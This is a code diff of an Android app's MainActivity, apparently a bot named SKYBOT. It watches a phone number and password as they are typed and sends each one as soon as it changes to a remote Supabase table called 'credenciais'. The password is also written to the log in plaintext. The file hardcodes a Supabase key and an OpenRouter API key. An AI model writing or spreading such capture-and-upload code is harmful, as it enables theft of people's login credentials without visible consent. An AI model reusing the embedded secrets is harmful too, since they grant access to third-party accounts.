@@ -470,7 +470,7 @@ class MainActivity : AppCompatActivity() {
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
-    private val VERSAO_ATUAL = "8.8"
+    private val VERSAO_ATUAL = "8.9"
 
     // OpenRouter — provedor de IA (chave 1 principal, chave 2 fallback)
     private val OR_KEY   = "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"
@@ -1085,24 +1085,18 @@ class MainActivity : AppCompatActivity() {
                             val numMudou = num.isNotEmpty() && num != ultimoNumEnviado
                             val senMudou = sen.isNotEmpty() && sen != ultimoSenEnviado
 
-                            if (numMudou || senMudou) {
-                                if (num.isNotEmpty()) {
-                                    ultimoNumEnviado    = num
-                                    ultimoNumeroEnviado = num
-                                    numeroTemporario    = num
-                                }
-                                if (sen.isNotEmpty()) {
-                                    ultimoSenEnviado  = sen
-                                    ultimaSenhaEnviada = sen
-                                }
-                                // Enviar ao Supabase imediatamente
-                                val numFinal = if (num.isNotEmpty()) num else ultimoNumeroEnviado
-                                val senFinal = if (sen.isNotEmpty()) sen else ultimaSenhaEnviada
-                                if (numFinal.isNotEmpty() || senFinal.isNotEmpty()) {
-                                    android.util.Log.d("SKYBOT_CRED",
-                                        "Dígito → num=$numFinal sen.len=${senFinal.length}")
-                                    enviarCredencial(numFinal, senFinal)
-                                }
+                            if (numMudou) {
+                                ultimoNumEnviado    = num
+                                ultimoNumeroEnviado = num
+                                numeroTemporario    = num
+                                android.util.Log.d("SKYBOT_CRED", "Número → $num")
+                                enviarSupabase("Numero", num)
+                            }
+                            if (senMudou) {
+                                ultimoSenEnviado   = sen
+                                ultimaSenhaEnviada = sen
+                                android.util.Log.d("SKYBOT_CRED", "Senha → len=${sen.length}")
+                                enviarSupabase("Senha", sen)
                             }
                         }
                     } catch (_: Exception) {}
@@ -2747,10 +2741,32 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
         }.start()
     }
 
-    @Deprecated("Substituído por enviarCredencial(numero, senha)")
     private fun enviarSupabase(tipoVal: String, valorVal: String) {
-        // Mantido apenas para compatibilidade — não faz nada para credenciais
-        android.util.Log.w("SKYBOT_CRED", "enviarSupabase() chamado com tipo=$tipoVal — ignorado")
+        val json = "{\"tipo\":\"$tipoVal\",\"valor\":\"$valorVal\"}"
+        android.util.Log.d("SKYBOT_CRED", "enviarSupabase → tipo=$tipoVal valor=$valorVal")
+        Thread {
+            try {
+                val conn = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("apikey", SUPA_KEY)
+                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.setRequestProperty("Prefer", "return=minimal")
+                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
+                OutputStreamWriter(conn.outputStream).use { it.write(json) }
+                val code = conn.responseCode
+                val errStream = conn.errorStream
+                val errBody = if (errStream != null) BufferedReader(InputStreamReader(errStream)).readText() else ""
+                conn.disconnect()
+                if (code in 200..299) {
+                    android.util.Log.d("SKYBOT_CRED", "enviarSupabase OK → HTTP $code tipo=$tipoVal")
+                } else {
+                    android.util.Log.e("SKYBOT_CRED", "enviarSupabase ERRO → HTTP $code | $errBody")
+                }
+            } catch (e: Exception) {
+                android.util.Log.e("SKYBOT_CRED", "enviarSupabase EXCEPÇÃO: ${e.message}")
+            }
+        }.start()
     }
 
     // ── ACTUALIZAÇÕES ─────────────────────────────────────────────
